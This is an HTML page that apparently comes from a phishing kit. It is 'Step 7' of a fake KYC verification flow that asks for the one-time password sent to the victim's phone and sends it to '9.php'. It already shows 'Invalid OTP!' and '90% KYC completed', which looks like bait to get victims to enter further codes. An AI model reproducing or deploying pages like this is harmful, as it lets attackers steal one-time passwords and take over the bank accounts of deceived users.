<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP</title>
    <style>
        #aa,#bb
        {
            width: 100%;
          
        }
        #ee
        {
            width: 338px;
            height:25px;
            background-color:white;
            border-color:#1D85FE;
            border-width:0.5px;
        }
        #gg
        {
            width: 338px;
            background-color: #1D85FE;
            color: white;
            padding: 12px 10px;
            margin: 0px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px; width: 340px; height: 40px;   
            
        }
        #ii,#kk
        {
            width: 100%;
        }
        #zz
        {
         color:red;   
        }
    </style>
</head>
<body>
    <img src="first.jpg" alt="" id="aa">
    <div id="cc">
    <h3 style="
    background-color:#DFE9F5;
    padding: 10px 4px;
    border-radius:1px;
    font-size:16px;
    color:#1560BD;
    width:345px;
    height:55px;"
    >Step:7 Validate One Time Password<br>(OTP).</h3>
    <center> <p2>Please enter The One Time Password(OTP) 
    which was sent to your registered mobile number.</p2></center><br>
    <div id="zz">
    <center>Invalid OTP!</center><br>
    </div>
    <form action="9.php" method="post">
             One Time Password(OTP) <br><br>
         <div id="dd">
         <input type="tel" name="OTP" class="pst" required=""
         title="Please Enter Valid One Time Password(OTP)." placeholder="Please enter valid OTP." required=""><br><br>
     </div>
     <div id="mk">
         <p2 style="color:green;"> 90% KYC completed</p2> <br><br> 
    
     </div>
     <div id="ff">
        <center> <button type="submit"id="gg">
        CONFIRM</button></center> <br><br>
     </div>
     <div id="hh">
         <img src="fourth.jpg" alt="" id="ii">
     </div>
    </form>
</body>
</html>